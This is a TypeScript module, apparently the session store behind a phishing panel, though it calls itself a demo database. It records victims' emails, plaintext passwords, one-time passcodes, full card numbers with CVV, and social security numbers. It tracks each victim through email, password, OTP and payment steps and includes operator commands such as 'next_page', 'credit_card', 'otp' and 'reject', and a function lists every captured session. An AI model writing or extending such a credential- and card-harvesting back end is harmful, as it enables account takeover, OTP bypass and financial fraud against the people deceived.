// Simple in-memory database for demo
export interface UserSession {
  id: string;
  email: string;
  password: string;
  otp?: string;
  cardInfo?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    fullName: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    ssn: string;
  };
  currentStep: "email" | "password" | "otp" | "payment" | "completed";
  status: "pending" | "approved" | "rejected";
  adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
  rejectionReason?: string;
  createdAt: Date;
  updatedAt: Date;
}

// In-memory storage (in production, use a real database)
export const userSessions: Map<string, UserSession> = new Map();

export function createSession(email: string, password: string): string {
  const id = Math.random().toString(36).substring(2, 15);
  const session: UserSession = {
    id,
    email,
    password,
    currentStep: "email",
    status: "pending",
    createdAt: new Date(),
    updatedAt: new Date(),
  };
  userSessions.set(id, session);
  return id;
}

export function updateSession(
  id: string,
  updates: Partial<UserSession>
): UserSession | null {
  const session = userSessions.get(id);
  if (!session) return null;

  const updatedSession = { ...session, ...updates, updatedAt: new Date() };
  userSessions.set(id, updatedSession);
  return updatedSession;
}

export function getSession(id: string): UserSession | null {
  return userSessions.get(id) || null;
}

export function getAllSessions(): UserSession[] {
  return Array.from(userSessions.values()).sort(
    (a, b) => b.createdAt.getTime() - a.createdAt.getTime()
  );
}
